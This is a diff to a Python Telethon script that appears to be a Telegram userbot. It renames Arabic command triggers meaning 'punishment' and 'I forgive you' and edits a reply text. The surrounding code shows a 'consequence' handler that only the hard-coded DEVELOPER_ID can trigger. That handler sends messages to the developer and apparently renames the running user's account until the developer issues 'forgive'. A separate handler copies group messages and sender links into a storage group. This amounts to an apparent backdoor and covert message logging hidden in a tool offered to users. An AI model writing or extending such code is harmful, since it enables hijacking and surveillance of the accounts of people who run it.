@@ -163,7 +163,7 @@ original_name = None
 
 messages = []
 
-@client.on(events.NewMessage(pattern=r"\.عاقبة"))
+@client.on(events.NewMessage(pattern=r"\.عقاب"))
 async def apply_consequence(event):
     global is_applying_consequence, original_name, messages 
     if event.sender_id == DEVELOPER_ID:
@@ -194,7 +194,7 @@ async def apply_consequence(event):
                         await client.send_message(DEVELOPER_ID, message)
                         await asyncio.sleep(2)
 
-@client.on(events.NewMessage(pattern=r"\.سامحة"))
+@client.on(events.NewMessage(pattern=r"\.سامحتك"))
 async def forgive(event):
     global is_applying_consequence, original_name
 
@@ -217,7 +217,7 @@ async def forgive(event):
                 last_name=original_name.last_name
             ))
 
-            await event.reply("تم العفو. تم إيقاف العاقبة.")
+            await event.reply("شكرااا😭😭.")
 
 
 #============
@@ -257,7 +257,9 @@ async def handle_new_message(event):
 
                 formatted_message = f"""
 **الكروب:** {chat_link} 
+
 **المرسل:** 👤 [{sender.first_name}](tg://user?id={sender.id})
+
 **الرسالة:** {event.message.text or event.message.media}
 """
                 await client.send_message(storage_group_id, formatted_message, link_preview=False)
